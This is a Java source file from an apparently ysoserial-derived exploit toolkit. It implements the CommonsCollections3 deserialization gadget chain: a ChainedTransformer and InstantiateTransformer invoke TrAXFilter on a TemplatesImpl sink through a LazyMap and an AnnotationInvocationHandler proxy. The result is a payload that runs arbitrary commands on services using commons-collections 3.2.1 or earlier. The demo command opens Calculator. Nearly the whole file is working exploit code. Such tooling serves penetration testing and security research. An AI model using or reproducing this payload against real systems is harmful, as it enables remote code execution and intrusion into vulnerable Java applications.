package com.ppp.chain.commonscollections3;

import com.ppp.JavaClassHelper;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/**
 * @author Whoopsunix
 */
@Dependencies({"commons-collections:commons-collections:<=3.2.1"})
@Authors({Authors.FROHOFF})
@Sink({Sink.TemplatesImpl})
public class CommonsCollections3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(CommonsCollections3.class, args);

        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(CommonsCollections3.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommandType(EnchantEnums.ScriptEngine);
        sinksHelper.setSplit(true);
        sinksHelper.setCommand("open -a Calculator.app");
//        sinksHelper.setCommand("ifconfig");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(CommonsCollections3.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates})};

        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        final Map mapProxy = KickOff.createMemoitizedProxy(lazyMap, Map.class);

        InvocationHandler handler = KickOff.annotationInvocationHandler(mapProxy);
        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        return handler;
    }
}
